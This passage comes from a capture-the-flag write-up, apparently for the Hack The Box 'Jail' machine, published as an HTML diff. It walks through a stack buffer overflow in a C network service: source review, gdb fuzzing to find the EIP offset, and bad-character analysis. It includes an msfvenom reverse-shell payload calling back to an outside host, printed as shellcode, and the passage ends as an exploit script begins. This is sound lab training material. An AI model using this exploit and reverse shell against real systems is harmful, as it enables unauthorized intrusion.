+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;OK Authentication success. Send command.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+        <span class="n">n</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">perror</span><span class="p">(</span><span class="s">&quot;Socket read error&quot;</span><span class="p">);</span>
+            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="s">&quot;OPEN&quot;</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;OK Jail doors opened.&quot;</span><span class="p">);</span>
+            <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="s">&quot;CLOSE&quot;</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;OK Jail doors closed.&quot;</span><span class="p">);</span>
+            <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;ERR Invalid command.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+            <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;ERR Authentication failed.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">sockfd</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">newsockfd</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">port</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">clientlen</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">server_addr</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">client_addr</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">n</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">pid</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">sockyes</span><span class="p">;</span>
+    <span class="n">sockyes</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">sockfd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">perror</span><span class="p">(</span><span class="s">&quot;Socket error&quot;</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sockyes</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">perror</span><span class="p">(</span><span class="s">&quot;Setsockopt error&quot;</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">memset</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">server_addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">server_addr</span><span class="p">));</span>
+    <span class="n">port</span> <span class="o">=</span> <span class="mi">7411</span><span class="p">;</span>
+    <span class="n">server_addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+    <span class="n">server_addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">INADDR_ANY</span><span class="p">;</span>
+    <span class="n">server_addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">bind</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">server_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">server_addr</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">perror</span><span class="p">(</span><span class="s">&quot;Bind error&quot;</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">listen</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="mi">200</span><span class="p">);</span>
+    <span class="n">clientlen</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">client_addr</span><span class="p">);</span>
+    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">newsockfd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">client_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">clientlen</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">newsockfd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">perror</span><span class="p">(</span><span class="s">&quot;Accept error&quot;</span><span class="p">);</span>
+            <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="n">pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">pid</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">perror</span><span class="p">(</span><span class="s">&quot;Fork error&quot;</span><span class="p">);</span>
+            <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">pid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">close</span><span class="p">(</span><span class="n">sockfd</span><span class="p">);</span>
+            <span class="n">exit</span><span class="p">(</span><span class="n">handle</span><span class="p">(</span><span class="n">newsockfd</span><span class="p">));</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="n">close</span><span class="p">(</span><span class="n">newsockfd</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>From the code we can extract the following useful information:</p>
+<ol>
+<li>
+<p>hardcoded username (<code>admin</code>) and password (<code>1974jailbreak!</code>)</p>
+</li>
+<li>
+<p>the <code>strcpy</code> function will copy <code>password</code> which is a 256 bytes buffer (<code>char password[256]</code>) into <code>userpass</code> which was initialized as a 16 bytes buffer (<code>char userpass[16]</code>). This generates a buffer overflow we can exploit.</p>
+</li>
+<li>
+<p>The binary listens on port 7411 </p>
+</li>
+<li>
+<p>I am not a <code>C</code> expert but once the authentication is successfull the binary really does nothing special, it looks like just a dummy application. </p>
+</li>
+</ol>
+<p>So let's see this in practice by connecting to the application on port 7411 with netcat:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> nc <span class="m">10</span>.10.10.34 <span class="m">7411</span>
+<span class="go">OK Ready. Send USER command.</span>
+<span class="go">DEBUG</span>
+<span class="go">OK DEBUG mode on.</span>
+<span class="go">USER admin</span>
+<span class="go">OK Send PASS command.</span>
+<span class="go">PASS 1974jailbreak!</span>
+<span class="go">Debug: userpass buffer @ 0xffffd610</span>
+<span class="go">OK Authentication success. Send command.</span>
+<span class="go">OPEN</span>
+<span class="go">OK Jail doors opened.m4rc0ff@SittingDucks:~$ </span>
+</pre></div>
+
+
+<p>Once I connect, I enable the <code>DEBUG</code> mode and then I provide username and password. The authentication is successful. When I run the command <code>OPEN</code> I get the message <code>OK Jail doors opened.</code> but nothing really happens, the application exits. Since we enabled the <code>DEBUG</code> mode we have the memory address for the <code>userpass</code>, that is <code>0xffffd610</code>.</p>
+<h5 id="fuzzing">Fuzzing</h5>
+<p>With this information we can now perform some fuzzing to prove that the application is vulnerable to buffer overflow and see if we can exploit that to get a shell.</p>
+<p>First I create a pattern of 50 "A" characters:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> msf-pattern_create -l <span class="m">50</span> -s A
+<span class="go">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>
+</pre></div>
+
+
+<p>Then I start the application with <code>gdb</code> (with the <code>gef</code> plugin installed) and I hit the <code>run</code> command:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/jail$</span> gdb ./jail
+<span class="go">GNU gdb (Debian 9.2-1) 9.2</span>
+<span class="go">Copyright (C) 2020 Free Software Foundation, Inc.</span>
+<span class="go">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span>
+<span class="go">This is free software: you are free to change and redistribute it.</span>
+<span class="go">There is NO WARRANTY, to the extent permitted by law.</span>
+<span class="go">Type &quot;show copying&quot; and &quot;show warranty&quot; for details.</span>
+<span class="go">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span>
+<span class="go">Type &quot;show configuration&quot; for configuration details.</span>
+<span class="go">For bug reporting instructions, please see:</span>
+<span class="go">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span>
+<span class="go">Find the GDB manual and other documentation resources online at:</span>
+<span class="go">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span>
+
+<span class="go">For help, type &quot;help&quot;.</span>
+<span class="go">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</span>
+<span class="go">GEF for linux ready, type `gef&#39; to start, `gef config&#39; to configure</span>
+<span class="go">80 commands loaded for GDB 9.2 using Python engine 3.8</span>
+<span class="go">Reading symbols from ./jail...</span>
+<span class="gp gp-VirtualEnv">(No debugging symbols found in ./jail)</span>
+<span class="go">gef➤  run</span>
+<span class="go">Starting program: /home/m4rc0ff/Documents/htbBoxes/jail/jail </span>
+</pre></div>
+
+
+<p>Then I run the application with netcat:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/jail$</span> nc <span class="m">127</span>.0.0.1 <span class="m">7411</span>
+<span class="go">OK Ready. Send USER command.</span>
+<span class="go">USER admin</span>
+<span class="go">OK Send PASS command.</span>
+<span class="go">PASS AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>
+</pre></div>
+
+
+<p>but nothing happened, I only get the following message in <code>gdb</code>:</p>
+<div class="highlight"><pre><span></span><span class="go">[Detaching after fork from child process 6172]</span>
+</pre></div>
+
+
+<p>A quick search on Google and I found <a href="https://stackoverflow.com/questions/4300317/meaning-of-detaching-after-fork-from-child-process-15">this article</a>. Following the suggestion I ran the following commands on <code>gdb</code> to follow the child process:</p>
+<div class="highlight"><pre><span></span><span class="go">gef➤  set follow-fork-mode child</span>
+<span class="go">gef➤  set detach-on-fork off</span>
+</pre></div>
+
+
+<p>Then I ran the application again as I did before and I provide the pattern of 50 A's as the password:</p>
+<p>this time, this is what we see on <code>gdb</code>:</p>
+<div class="highlight"><pre><span></span><span class="go">gef➤  set follow-fork-mode child</span>
+<span class="go">gef➤  set detach-on-fork off</span>
+<span class="go">gef➤  run</span>
+<span class="go">Starting program: /home/m4rc0ff/Documents/htbBoxes/jail/jail </span>
+<span class="go">[Attaching after process 2463 fork to child process 2468]</span>
+<span class="go">[New inferior 2 (process 2468)]</span>
+
+<span class="go">Thread 2.1 &quot;jail&quot; received signal SIGSEGV, Segmentation fault.</span>
+<span class="go">[Switching to process 2468]</span>
+<span class="go">0x41414141 in ?? ()</span>
+<span class="go">[ Legend: Modified register | Code | Heap | Stack | String ]</span>
+<span class="go">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span>
+<span class="gp">$</span>eax   : 0x0       
+<span class="gp">$</span>ebx   : 0x0       
+<span class="gp">$</span>ecx   : 0x0804c1c4  →  0x00000000
+<span class="gp">$</span>edx   : 0x0804c1c3  →  0x0000000a
+<span class="gp">$</span>esp   : 0xffffcab0  →  <span class="s2">&quot;AAAAAAAAAAAAAAAAAA&quot;</span>
+<span class="gp">$</span>ebp   : 0x41414141 <span class="o">(</span><span class="s2">&quot;AAAA&quot;</span>?<span class="o">)</span>
+<span class="gp">$</span>esi   : 0xf7fad000  →  0x001dfd6c
+<span class="gp">$</span>edi   : 0xf7fad000  →  0x001dfd6c
+<span class="gp">$</span>eip   : 0x41414141 <span class="o">(</span><span class="s2">&quot;AAAA&quot;</span>?<span class="o">)</span>
+<span class="gp">$</span>eflags: <span class="o">[</span>ZERO carry PARITY adjust sign <span class="nb">trap</span> INTERRUPT direction overflow RESUME virtualx86 identification<span class="o">]</span>
+<span class="gp">$</span>cs: 0x0023 <span class="nv">$ss</span>: 0x002b <span class="nv">$ds</span>: 0x002b <span class="nv">$es</span>: 0x002b <span class="nv">$fs</span>: 0x0000 <span class="nv">$gs</span>: 0x0063 
+<span class="go">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────</span>
+<span class="go">0xffffcab0│+0x0000: &quot;AAAAAAAAAAAAAAAAAA&quot;         ← $esp</span>
+<span class="go">0xffffcab4│+0x0004: &quot;AAAAAAAAAAAAAA&quot;</span>
+<span class="go">0xffffcab8│+0x0008: &quot;AAAAAAAAAA&quot;</span>
+<span class="go">0xffffcabc│+0x000c: &quot;AAAAAA&quot;</span>
+<span class="go">0xffffcac0│+0x0010: 0xff004141 (&quot;AA&quot;?)</span>
+<span class="go">0xffffcac4│+0x0014: 0x00000002</span>
+<span class="go">0xffffcac8│+0x0018: 0x00000001</span>
+<span class="go">0xffffcacc│+0x001c: 0x41410001</span>
+<span class="go">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────</span>
+<span class="go">[!] Cannot disassemble from $PC</span>
+<span class="go">[!] Cannot access memory at address 0x41414141</span>
+<span class="go">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────</span>
+<span class="go">[#0] Id 1, Name: &quot;jail&quot;, stopped 0x41414141 in ?? (), reason: SIGSEGV</span>
+<span class="go">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────</span>
+<span class="go">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+</pre></div>
+
+
+<p>We can see that <code>jail</code> stopped because of a segmentation fault and that the EIP register has been filled with four A's (<code>0x41414141</code> in hex). The EIP (Extended Instruction Pointer) register contains the address of the next instruction to be executed and since the application does not know what address is <code>0x41414141</code> it stops with <code>SIGSEGV</code>.</p>
+<p>The fact that we are able to control the EIP is the key for us to be able to exploit this buffer overflow. </p>
+<p>Now within <code>gdb</code> itself I generate another pattern but this time I want it to be random:</p>
+<div class="highlight"><pre><span></span><span class="go">gef➤  pattern create 50</span>
+<span class="go">[+] Generating a pattern of 50 bytes</span>
+<span class="go">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama</span>
+<span class="go">[+] Saved as &#39;$_gef0&#39;</span>
+</pre></div>
+
+
+<p>then I do the same login process again passing the random pattern:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/jail$</span> nc <span class="m">127</span>.0.0.1 <span class="m">7411</span>
+<span class="go">OK Ready. Send USER command.</span>
+<span class="go">DEBUG </span>
+<span class="go">OK DEBUG mode on.</span>
+<span class="go">USER admin</span>
+<span class="go">OK Send PASS command.</span>
+<span class="go">PASS aaaabaaacaaadaaaegaaaaaafaaahaaaiaaajaaakaaalaaama</span>
+<span class="go">Debug: userpass buffer @ 0xffffca90</span>
+</pre></div>
+
+
+<p>NOTE that the <code>DEBUG</code> mode gives us the memory address of <code>userpass</code> which will be useful later.</p>
+<p><code>gdb</code> shows this:</p>
+<div class="highlight"><pre><span></span><span class="go">gef➤  set follow-fork-mode child</span>
+<span class="go">gef➤  set detach-on-fork off</span>
+<span class="go">gef➤  run</span>
+<span class="go">Starting program: /home/m4rc0ff/Documents/htbBoxes/jail/jail </span>
+<span class="go">[Attaching after process 2568 fork to child process 2570]</span>
+<span class="go">[New inferior 2 (process 2570)]</span>
+
+<span class="go">Thread 2.1 &quot;jail&quot; received signal SIGSEGV, Segmentation fault.</span>
+<span class="go">[Switching to process 2570]</span>
+<span class="go">0x61616168 in ?? ()</span>
+<span class="go">[ Legend: Modified register | Code | Heap | Stack | String ]</span>
+<span class="go">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span>
+<span class="gp">$</span>eax   : 0x0       
+<span class="gp">$</span>ebx   : 0x0       
+<span class="gp">$</span>ecx   : 0x0804c1c4  →  0x00000000
+<span class="gp">$</span>edx   : 0x0804c1c3  →  0x0000000a
+<span class="gp">$</span>esp   : 0xffffcab0  →  <span class="s2">&quot;iaaajaaakaaalaaama&quot;</span>
+<span class="gp">$</span>ebp   : 0x61616167 <span class="o">(</span><span class="s2">&quot;gaaa&quot;</span>?<span class="o">)</span>
+<span class="gp">$</span>esi   : 0xf7fad000  →  0x001dfd6c
+<span class="gp">$</span>edi   : 0xf7fad000  →  0x001dfd6c
+<span class="gp">$</span>eip   : 0x61616168 <span class="o">(</span><span class="s2">&quot;haaa&quot;</span>?<span class="o">)</span>
+<span class="gp">$</span>eflags: <span class="o">[</span>ZERO carry PARITY adjust sign <span class="nb">trap</span> INTERRUPT direction overflow RESUME virtualx86 identification<span class="o">]</span>
+<span class="gp">$</span>cs: 0x0023 <span class="nv">$ss</span>: 0x002b <span class="nv">$ds</span>: 0x002b <span class="nv">$es</span>: 0x002b <span class="nv">$fs</span>: 0x0000 <span class="nv">$gs</span>: 0x0063 
+<span class="go">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────</span>
+<span class="go">0xffffcab0│+0x0000: &quot;iaaajaaakaaalaaama&quot;         ← $esp</span>
+<span class="go">0xffffcab4│+0x0004: &quot;jaaakaaalaaama&quot;</span>
+<span class="go">0xffffcab8│+0x0008: &quot;kaaalaaama&quot;</span>
+<span class="go">0xffffcabc│+0x000c: &quot;laaama&quot;</span>
+<span class="go">0xffffcac0│+0x0010: 0xff00616d (&quot;ma&quot;?)</span>
+<span class="go">0xffffcac4│+0x0014: 0x00000002</span>
+<span class="go">0xffffcac8│+0x0018: 0x00000001</span>
+<span class="go">0xffffcacc│+0x001c: 0x61610001</span>
+<span class="go">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────</span>
+<span class="go">[!] Cannot disassemble from $PC</span>
+<span class="go">[!] Cannot access memory at address 0x61616168</span>
+<span class="go">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────</span>
+<span class="go">[#0] Id 1, Name: &quot;jail&quot;, stopped 0x61616168 in ?? (), reason: SIGSEGV</span>
+<span class="go">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────</span>
+<span class="go">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+</pre></div>
+
+
+<p>The EIP has now been filled with the "haaa" string. To find the exact offset we can do a search on the EIP address, that is <code>0x61616168</code>:</p>
+<div class="highlight"><pre><span></span><span class="go">gef➤  pattern search 0x61616168</span>
+<span class="go">[+] Searching &#39;0x61616168&#39;</span>
+<span class="go">[+] Found at offset 28 (little-endian search) likely</span>
+<span class="go">[+] Found at offset 25 (big-endian search)</span>
+</pre></div>
+
+
+<p>This tells us the offset is 28 and it means that after 28 characters we will end up exactly to the <code>EIP</code>. To prove that we can send another string to the application as follow:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/jail$</span> nc <span class="m">127</span>.0.0.1 <span class="m">7411</span>
+<span class="go">OK Ready. Send USER command.</span>
+<span class="go">USER admin</span>
+<span class="go">OK Send PASS command.</span>
+<span class="go">PASS AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCC</span>
+</pre></div>
+
+
+<p>In this case i have sent 28 A's, 4 B's, and 20 C's. If our calculations are correct the <code>EIP</code> should now contain 4 B's.</p>
+<div class="highlight"><pre><span></span><span class="go">[ Legend: Modified register | Code | Heap | Stack | String ]</span>
+<span class="go">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span>
+<span class="gp">$</span>eax   : 0x0       
+<span class="gp">$</span>ebx   : 0x0       
+<span class="gp">$</span>ecx   : 0x0804c1c4  →  0x00000000
+<span class="gp">$</span>edx   : 0x0804c1c3  →  0x0000000a
+<span class="gp">$</span>esp   : 0xffffcab0  →  <span class="s2">&quot;CCCCCCCCCCCCCCCCCCCC&quot;</span>
+<span class="gp">$</span>ebp   : 0x41414141 <span class="o">(</span><span class="s2">&quot;AAAA&quot;</span>?<span class="o">)</span>
+<span class="gp">$</span>esi   : 0xf7fad000  →  0x001dfd6c
+<span class="gp">$</span>edi   : 0xf7fad000  →  0x001dfd6c
+<span class="gp">$</span>eip   : 0x42424242 <span class="o">(</span><span class="s2">&quot;BBBB&quot;</span>?<span class="o">)</span>
+<span class="gp">$</span>eflags: <span class="o">[</span>ZERO carry PARITY adjust sign <span class="nb">trap</span> INTERRUPT direction overflow RESUME virtualx86 identification<span class="o">]</span>
+<span class="gp">$</span>cs: 0x0023 <span class="nv">$ss</span>: 0x002b <span class="nv">$ds</span>: 0x002b <span class="nv">$es</span>: 0x002b <span class="nv">$fs</span>: 0x0000 <span class="nv">$gs</span>: 0x0063 
+<span class="go">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────</span>
+<span class="go">0xffffcab0│+0x0000: &quot;CCCCCCCCCCCCCCCCCCCC&quot;       ← $esp</span>
+<span class="go">0xffffcab4│+0x0004: &quot;CCCCCCCCCCCCCCCC&quot;</span>
+<span class="go">0xffffcab8│+0x0008: &quot;CCCCCCCCCCCC&quot;</span>
+<span class="go">0xffffcabc│+0x000c: &quot;CCCCCCCC&quot;</span>
+<span class="go">0xffffcac0│+0x0010: &quot;CCCC&quot;</span>
+<span class="go">0xffffcac4│+0x0014: 0x00000000</span>
+<span class="go">0xffffcac8│+0x0018: 0x00000001</span>
+<span class="go">0xffffcacc│+0x001c: 0x41410001</span>
+<span class="go">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────</span>
+<span class="go">[!] Cannot disassemble from $PC</span>
+<span class="go">[!] Cannot access memory at address 0x42424242</span>
+<span class="go">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────</span>
+<span class="go">[#0] Id 1, Name: &quot;jail&quot;, stopped 0x42424242 in ?? (), reason: SIGSEGV</span>
+<span class="go">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────</span>
+<span class="go">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+</pre></div>
+
+
+<p>As shown above we see the 4 B's in the EIP as expected. </p>
+<p>We can now start designing our exploit script. </p>
+<p>If you know a little about buffer overflow you would know you need to look for bad characters when preparing a shellcode. </p>
+<p>This lines of code in the program:</p>
+<div class="highlight"><pre><span></span><span class="kt">char</span> <span class="n">strchr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\n\x00</span><span class="s">&quot;</span><span class="p">;</span>
+
+<span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span>
+
+<span class="n">token</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">strchr</span><span class="p">);</span>
+        <span class="k">while</span> <span class="p">(</span><span class="n">token</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">gotuser</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="n">gotpass</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>           
+<span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span>
+</pre></div>
+
+
+<p>defines <code>\n</code> and <code>x00</code> as delimiters. We know <code>x00</code> is always considered a bad character. <code>\n</code> is represented by an <code>A</code> (\x0A in hex) which is 10 in decimal. This can cause issues and our shell will not work because we have an IP addresse that contains the number 10 which in this case will be considered as a new line.</p>
+<p>Since we know what the bad characters are we can use <code>msfvenom</code> to create our shellcode:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> msfvenom -p linux/x86/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.10.14.2 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -f py -b <span class="s1">&#39;\x00\x0a\&#39;</span>
+<span class="go">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span>
+<span class="go">[-] No arch selected, selecting arch: x86 from the payload</span>
+<span class="go">Found 11 compatible encoders</span>
+<span class="go">Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span>
+<span class="go">x86/shikata_ga_nai succeeded with size 95 (iteration=0)</span>
+<span class="go">x86/shikata_ga_nai chosen with final size 95</span>
+<span class="go">Payload size: 95 bytes</span>
+<span class="go">Final size of py file: 479 bytes</span>
+<span class="go">buf =  b&quot;&quot;</span>
+<span class="go">buf += b&quot;\xdd\xc1\xbb\xc2\x8b\x64\xde\xd9\x74\x24\xf4\x58\x31&quot;</span>
+<span class="go">buf += b&quot;\xc9\xb1\x12\x31\x58\x17\x83\xc0\x04\x03\x9a\x98\x86&quot;</span>
+<span class="go">buf += b&quot;\x2b\x2b\x44\xb1\x37\x18\x39\x6d\xd2\x9c\x34\x70\x92&quot;</span>
+<span class="go">buf += b&quot;\xc6\x8b\xf3\x40\x5f\xa4\xcb\xab\xdf\x8d\x4a\xcd\xb7&quot;</span>
+<span class="go">buf += b&quot;\x07\xa7\x23\x45\x70\xb5\x3b\x48\x3b\x30\xda\xfa\x5d&quot;</span>
+<span class="go">buf += b&quot;\x13\x4c\xa9\x12\x90\xe7\xac\x98\x17\xa5\x46\x4d\x37&quot;</span>
+<span class="go">buf += b&quot;\x39\xfe\xf9\x68\x92\x9c\x90\xff\x0f\x32\x30\x89\x31&quot;</span>
+<span class="go">buf += b&quot;\x02\xbd\x44\x31&quot;</span>
+</pre></div>
+
+
+<p>Now that we have our shellcode we can put things together on a python script:</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">buf</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6</span><span class="s2">&quot;</span>
